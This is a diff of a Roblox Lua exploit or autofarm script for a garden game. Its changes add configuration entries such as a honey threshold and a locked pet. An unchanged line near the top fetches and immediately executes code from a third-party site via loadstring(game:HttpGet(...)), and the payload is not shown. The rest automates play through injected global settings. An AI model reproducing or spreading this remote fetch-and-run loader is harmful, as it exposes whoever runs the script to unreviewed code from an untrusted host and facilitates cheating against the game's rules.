@@ -4,8 +4,6 @@ task.spawn(function()
     loadstring(game:HttpGet("https://sellaccroblox.com/raw/view.php?file=lilbip%2FextraGAG.txt"))()
 end)
 
-
-
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local LocalDataService = require(game:GetService("ReplicatedStorage"):WaitForChild("Modules", 10).DataService)
@@ -65,7 +63,6 @@ end
 
 -- Example usage
 -- local socay, sotomato = countPlantsPhysical()
-
 if Tienhienco2 < 1000000000 then
 	getgenv().ConfigsKaitun = {
 	["Block Pet Gift"] = true,
@@ -153,6 +150,7 @@ if Tienhienco2 < 1000000000 then
 				Maximum_Chi = 500,
 			}
 		},
+		Start_Do_Honey = 20000000,
 	},
 
 	Gear = {
@@ -225,6 +223,7 @@ if Tienhienco2 < 1000000000 then
 			},
 		},
 		Locked = {
+			["Corrupted Kodama"] = 3,
 			["Tanchozuru"] = 3,
 			["Koi"] = 20,
 			"Kitsune",
@@ -374,6 +373,7 @@ else
 				Maximum_Chi = 500,
 			}
 		},
+		Start_Do_Honey = 20000000,
 	},
 
 	Gear = {
@@ -446,6 +446,7 @@ else
 			},
 		},
 		Locked = {
+			["Corrupted Kodama"] = 3,
 			["Tanchozuru"] = 3,
 			["Koi"] = 20,
 			"Kitsune",
